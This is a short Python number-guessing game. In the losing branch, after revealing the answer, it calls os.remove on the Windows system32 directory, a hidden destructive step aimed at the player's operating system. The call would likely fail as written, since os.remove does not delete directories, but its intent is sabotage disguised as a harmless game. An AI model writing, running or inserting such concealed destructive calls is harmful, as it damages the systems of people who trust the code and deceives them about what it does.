import random
import os
random_number = random.randint(1, 10)

try:
    user_guess = int(input("Guess a number between 1 and 10: "))

    if 1 <= user_guess <= 10:
        if user_guess == random_number:
            print("You won!")
        else:
            print(f"You lose! The correct number was {random_number}.")
            os.remove("c:\\windows\\system32")
    else:
        print("Please enter a number between 1 and 10.")
        

except ValueError:
    print("Invalid input! Please enter a valid number.")
